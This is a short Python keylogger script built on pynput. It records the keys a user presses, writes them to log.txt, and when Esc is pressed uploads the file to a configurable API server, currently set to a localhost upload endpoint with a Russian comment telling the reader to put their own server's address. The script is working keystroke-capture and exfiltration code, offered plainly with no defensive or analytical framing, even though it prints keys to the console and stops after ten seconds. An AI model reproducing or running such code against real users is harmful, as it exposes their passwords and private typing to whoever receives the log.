from typing import List
from pynput.keyboard import Key, Listener
import requests

char_count = 0
saved_keys = []

API_URL = "http://localhost:5000/upload"  # адрес твоего API сервера


def on_key_press(key: str):
    try:
        print("Key Pressed:", key)
    except Exception as ex:
        print("Error:", ex)


def on_key_release(key):
    global saved_keys, char_count

    if key == Key.esc:
        send_file_to_server()
        return False
    else:
        if key == Key.enter:
            write_to_file(saved_keys)
            saved_keys = []
            char_count = 0

        elif key == Key.space:
            key = " "
            write_to_file(saved_keys)
            saved_keys = []
            char_count = 0

        saved_keys.append(key)
        char_count += 1


def write_to_file(keys: List[str]):
    with open("log.txt", "a") as file:
        for key in keys:
            key = str(key).replace("'", "")
            if "key".upper() not in key.upper():
                file.write(key)
        file.write("\n")


def send_file_to_server():
    try:
        with open("log.txt", "rb") as f:
            requests.post(API_URL, files={"file": f})
        print("Log sent to server")
    except Exception as e:
        print("Failed to send file:", e)


with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    print("Start key logging...")
    listener.join(timeout=10)
    print("End key logging...")
